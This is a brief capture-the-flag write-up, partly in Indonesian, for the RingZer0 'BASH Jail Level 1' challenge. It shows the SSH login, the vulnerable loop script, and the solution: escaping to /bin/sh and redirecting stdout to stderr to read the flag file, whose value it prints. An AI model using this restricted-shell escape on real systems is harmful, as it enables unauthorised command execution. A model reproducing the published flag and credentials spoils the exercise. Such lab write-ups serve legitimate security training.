# soal
User: level1 \
Password: level1 \
ssh://challenges.ringzer0ctf.com:10218

# setup
```bash
ssh level1@challenges.ringzer0ctf.com -p 10218
# pass: level1

RingZer0 Team Online CTF

BASH Jail Level 1:
Current user is uid=2001(level1) gid=2001(level1) groups=2001(level1),1000(challenger)

Flag is located at /home/level1/flag.txt

Challenge bash code:
-----------------------------

while :
do
        echo "Your input:"
        read input
        output=`$input`
done

-----------------------------
Your input:
```

# solve
```bash
# Your input:
/bin/sh
sh-4.3$ ls
sh-4.3$ cat /home/level1/flag.txt
sh-4.3$ aafafa
# sh: aafafa: command not found
sh-4.3$ ls 1>&2
# flag.txt  prompt.sh
sh-4.3$ cat /home/level1/flag.txt 1>&2
# FLAG-U96l4k6m72a051GgE5EN0rA85499172K
sh-4.3$ cat /home/level1/flag.txt >&2
# FLAG-U96l4k6m72a051GgE5EN0rA85499172K

## jika dilihat ketika kita memasukan perintah dan command tersebut berhasil output tidak ditampilkan
## sedangkan output error ditampilkan
## dengan itu kita bisa pindahkan output berhasil ke output error

## fungsi dari 1>&2
## adalah melakukan redirect output
## jika 1 adalah stdout, 2 adalah stderr
## maka kita mengalihkan semua output ke stderr
```

# flag
FLAG-U96l4k6m72a051GgE5EN0rA85499172K